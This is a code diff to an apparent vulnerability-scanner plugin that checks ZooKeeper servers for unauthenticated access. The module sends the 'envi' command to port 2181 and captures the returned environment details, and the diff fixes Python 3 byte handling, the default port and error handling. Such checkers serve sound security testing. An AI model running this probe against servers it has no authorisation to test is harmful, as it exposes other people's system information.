@@ -26,22 +26,21 @@ class ZookeeperUnauthPOC(POCBase):
         return output
     def _verify(self):
         host = self.getg_option("rhost")
-        port = self.getg_option("rport") or 21
+        port = self.getg_option("rport") or 2181
 
         result = {}
         try:
             s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
             s.connect((host,int(port)))
-            s.send('envi')
-            info = s.recv(4096)
+            s.send('envi'.encode())
+            info = s.recv(4096).decode()
             if 'zookeeper.version' in info:
                 result['VerifyInfo'] = {}
-                result['VerifyInfo']['URL'] = '{}:{}'.format(pr.hostname,port)
+                result['VerifyInfo']['URL'] = '{}:{}'.format(host,port)
                 result['extra'] = {}
                 result['extra']['evidence'] = info.strip()
-                break
-        except:
-            pass
+        except Exception as e:
+            logger.info(str(e))
         return self.parse_output(result)
     def _attack(self):
         return self._verify()
